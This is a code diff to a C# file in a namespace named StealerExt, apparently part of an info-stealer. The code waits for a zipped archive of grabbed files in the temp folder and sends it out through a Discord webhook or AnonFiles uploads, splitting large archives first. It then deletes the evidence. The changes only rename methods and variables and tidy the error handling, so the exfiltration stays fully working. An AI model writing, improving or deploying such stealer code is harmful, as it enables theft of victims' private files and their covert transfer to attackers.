@@ -11,15 +11,15 @@ namespace StealerExt
     {   
         public static void GetFiles()
         {
-            new API(API.wHook).idk("Waiting for file to be found and archived so it can be sent. If file is large then it can take a while!", null);
-            string upload = API.Temp + "files.zip";
-            string _FilesErr;
+            new API(API.wHook).SendMultiPartData("Waiting for file to be found and archived so it can be sent. If file is large then it can take a while!");
+            string upload = Path.Combine(API.Temp, "files.zip");
+            string _FilesData;
             while (!File.Exists(upload)) {}
             long size = new FileInfo(upload).Length;
             // Upload to cdn.discord.com via webhook.
             if (size < 7900000) 
             {
-                new API(API.wHook).idk("File found! Sending...", upload);
+                new API(API.wHook).SendMultiPartData("File found! Sending...", "GrabbedFiles.zip", upload);
             } 
             // Upload to AnonFiles.com
             else if (size < 19500000000)
@@ -35,22 +35,21 @@ namespace StealerExt
                         string ResponseBody = Encoding.ASCII.GetString(Response);
                         if (ResponseBody.Contains("\"error\": {"))
                         {
-                            _FilesErr = "Error: " + ResponseBody.Split('"')[7] + "\r\n";
+                            _FilesData = "Error: " + ResponseBody.Split('"')[7] + "\r\n";
                         }
                         else
                         {
-                            _FilesErr = "Files: " + ResponseBody.Split('"')[15] + "\r\n";
+                            _FilesData = "Files: " + ResponseBody.Split('"')[15] + "\r\n";
                         }
                     }
                 }
-                catch (Exception ex)
+                catch (WebException ex)
                 {
-                    _FilesErr = "Ex: " + ex.Message + "\r\n";
+                    _FilesData = "Ex: " + ex.Message + "\r\n";
                 }
-                new API(API.wHook).idk(_FilesErr, null);
+                new API(API.wHook).SendMultiPartData(_FilesData, null);
                 File.Delete(upload);
             }
-            // Split the zip file.
             else
             {
                 ZipFile zip = ZipFile.Read(upload);
@@ -75,19 +74,19 @@ namespace StealerExt
                             string ResponseBody = Encoding.ASCII.GetString(Response);
                             if (ResponseBody.Contains("\"error\": {"))
                             {
-                                _FilesErr = "Error: " + ResponseBody.Split('"')[7];
+                                _FilesData = "Error: " + ResponseBody.Split('"')[7];
                             }
                             else
                             {
-                                _FilesErr = "Files: " + ResponseBody.Split('"')[15];
+                                _FilesData = "Files: " + ResponseBody.Split('"')[15];
                             }
                         }
                     }
                     catch (WebException ex)
                     {
-                        _FilesErr = "Ex: " + ex.Message;
+                        _FilesData = $"Ex: {ex.Message}";
                     }
-                    new API(API.wHook).idk(_FilesErr, null);
+                    new API(API.wHook).SendMultiPartData(_FilesData, null);
                     File.Delete(file);
                 }
             }
